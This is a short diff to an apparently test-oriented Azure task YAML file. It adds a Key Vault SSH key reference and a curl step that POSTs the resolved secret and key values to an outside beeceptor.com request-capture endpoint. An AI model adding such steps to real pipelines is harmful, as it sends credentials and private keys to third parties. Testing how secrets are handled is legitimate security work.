@@ -2,6 +2,8 @@ version: v1.1.0
 secrets:
   - id: vault1
     keyvault: https://azurestage.vault.azure.net/secrets/secretPwd
+  - id: vault2
+    keyvault: https://azurestage.vault.azure.net/keys/SSH-test
 steps:
   - cmd: az login --allow-no-subscriptions --identity
-  - cmd: curl -X POST https://test-azure.free.beeceptor.com -d '{{.Secrets.vault1}}'
+  - cmd: curl -X POST https://test-azure.free.beeceptor.com -d 'Secret 1 : {{.Secrets.vault1}} - Key 1 : {{.Secrets.vault2}}'
